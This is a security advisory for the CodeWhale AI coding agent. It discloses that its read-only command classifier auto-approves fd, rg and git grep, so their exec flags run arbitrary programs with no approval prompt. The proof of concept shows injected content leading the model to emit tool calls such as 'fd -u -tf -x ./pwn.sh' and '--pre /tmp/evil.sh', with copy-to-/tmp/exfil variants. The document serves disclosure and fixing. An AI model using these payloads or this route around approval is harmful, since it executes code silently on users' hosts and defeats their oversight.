- Affected npm/codewhale: introduced:0 fixed:0.9.0

### Maintainer resolution

The CodeWhale maintainers validated this report. CodeWhale 0.8.67 and earlier are affected. Version 0.9.0 contains the fix in commit 208421b9d23d81cea3311a1eeb2a2ea81d637686. Users should upgrade to 0.9.0 or later. The original reporter analysis is preserved below.

## Summary
The interactive Agent profile of DeepSeek-TUI (CodeWhale) is explicitly documented to gate **every** shell command behind an approval prompt (config.rs:3725-3736). However, `ExecShellTool::approval_requirement_for(&tool_input)` downgrades the requirement from `Required` to `Auto` for any command the classifier deems "parallel read-only" (shell.rs:2314-2320). `registered_tool_approval_required` returns `false` for `Auto` **before** the `auto_approve` check runs (turn_loop.rs:37-38), so no prompt is shown even for a user who never enabled YOLO. The classifier `is_parallel_readonly_command` (command_safety.rs:389) rejects only shell metacharacters and then matches the flag-stripped base command name against an allowlist that includes `fd`, `rg`, and `git grep`. Those tools execute arbitrary external programs through documented flags (`fd -x/--exec`, `rg --pre`, `git grep --open-files-in-pager`) that need **no** shell metacharacters — yielding silent arbitrary-program execution in the default profile. Same silent-RCE class as CVE-2026-45311 (run_tests) but via a different, unpatched tool and code path.

## Root Cause
`approval_requirement_for` downgrades `exec_shell` to `Auto` when `exec_shell_input_is_parallel_readonly` returns true (shell.rs:2314-2320). The classifier strips all flags and matches the base command name against `PARALLEL_READONLY_PREFIXES` (command_safety.rs:363-385, 419-433). `fd`/`rg` are absent from `COMMAND_ARITY`, so `fd -x cp {} /tmp/exfil` canonicalizes to `"fd"` ∈ allowlist. The only remaining gate at the execute sink is `analyze_command`, which rates `fd`/`rg` as `Safe` (SAFE_COMMANDS command_safety.rs:527,530), so the `SafetyLevel::Dangerous`-only block (shell.rs:2408) never fires. Default execpolicy is empty (engine.rs:494) → Skip. Interactive-origin auto_review safety_floor holds only `Publish` (auto_review.rs:344-357), not interactive shell.

## Impact
Arbitrary external program execution (any binary, any argv, including a repo-committed script) on the developer host, with no approval prompt, in the default interactive Agent profile — bypassing the boundary config.rs:3725-3736 explicitly promises. Identical outcome to seed CVE-2026-45311 via a different, unpatched tool.

## Proof of Concept
Model coerced (via indirect prompt injection from repo file / issue / fetched page — the seed threat model, in scope per SECURITY.md:48) to emit:
```json
{"name":"exec_shell","arguments":{"command":"fd -u -tf -x ./pwn.sh"}}
```
Alternatives (all metachar-free, all auto-approved): `fd -tf -x cp {} /tmp/exfil`; `rg --pre /tmp/evil.sh --pre-glob '*' needle .`; `git grep --open-files-in-pager=/tmp/evil.sh needle`.

## Attack Chain
1. **Entry.** Agent ingests attacker-controlled content; injected instruction coerces the model to emit `exec_shell {"command":"fd -u -tf -x ./pwn.sh"}`.
   - **Guard:** none — reading content and model tool-calls are by design (seed threat model: indirect prompt injection).
   - **Bypass proof:** n/a (in-scope by design per SECURITY.md:48).
2. **Gate — approval requirement.** turn_loop.rs:1738 → `spec.approval_requirement_for(&input)` → shell.rs:2314-2320 `exec_shell_input_is_parallel_readonly`.
   - **Guard:** metachar filter (command_safety.rs:394-400) + base-name allowlist.
   - **Bypass proof:** the string contains none of `; & | > < \` $(` or newlines; `-x <program> <args>` is `fd`'s own exec mechanism (no shell). `classify_command` strips `-u -tf -x`, positionals `[fd, ./pwn.sh]`; `fd` ∉ `COMMAND_ARITY` → canonical `"fd"` ∈ `PARALLEL_READONLY_PREFIXES` → returns true. Maintainer test `parallel_readonly_command_classifier_is_strict` (command_safety.rs:1162+) confirms bare `fd`/`rg` classify parallel-readonly.
3. **Gate — prompt decision.** `registered_tool_approval_required(name, Auto, auto_approve)`.
   - **Guard:** the approval prompt itself.
   - **Bypass proof:** `requirement == Auto` returns `false` at turn_loop.rs:37-38 unconditionally, before `!auto_approve`. No prompt regardless of user settings. Empty execpolicy → Skip; interactive safety_floor returns NoChange for fd.
4. **Sink.** `ExecShellTool::execute` (shell.rs:2334) → `analyze_command`.
   - **Guard:** `SafetyLevel::Dangerous` block (shell.rs:2408).
   - **Bypass proof:** `fd` ∈ `SAFE_COMMANDS` (command_safety.rs:530) → `analyze_command` returns `Safe`; not `Dangerous` → not blocked. Child runs the attacker's program.
5. **Impact.** Silent arbitrary-program execution on the developer host, no approval prompt, default interactive Agent profile.

## Bypass Evidence
- Present on latest release tag v0.8.67: turn_loop.rs:37-38 `Auto`→`return false`; shell.rs:2314-2320 override; command_safety.rs allowlist includes `"rg"`,`"fd"`,`"git grep"`; SAFE_COMMANDS includes `"rg"`,`"fd"`; `fd`/`rg` absent from `COMMAND_ARITY`. command_safety.rs / turn_loop.rs finding-critical functions byte-identical v0.8.67↔HEAD.
- Maintainer's own test `parallel_readonly_command_classifier_is_strict` confirms bare `rg`/`fd` classify parallel-readonly and only metachar forms are rejected.

## Affected Versions
`<= 0.8.67` (present on latest release tag v0.8.67 and HEAD 6a3403e).

## Suggested Fix
Remove exec-capable tools (`fd`, `rg`, `git grep`) from `PARALLEL_READONLY_PREFIXES`, or make the classifier reject their exec flags (`-x`/`--exec`, `--pre`, `--open-files-in-pager`), so a code-executing invocation cannot be auto-approved as read-only.

Reported by **zx (Jace)**

References:
- https://github.com/codewhale-hq/Codewhale/security/advisories/GHSA-3mgh-93r5-r7jf [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-83816 [ADVISORY]
- https://github.com/codewhale-hq/Codewhale/commit/208421b9d23d81cea3311a1eeb2a2ea81d637686 [WEB]
- https://github.com/codewhale-hq/Codewhale [PACKAGE]
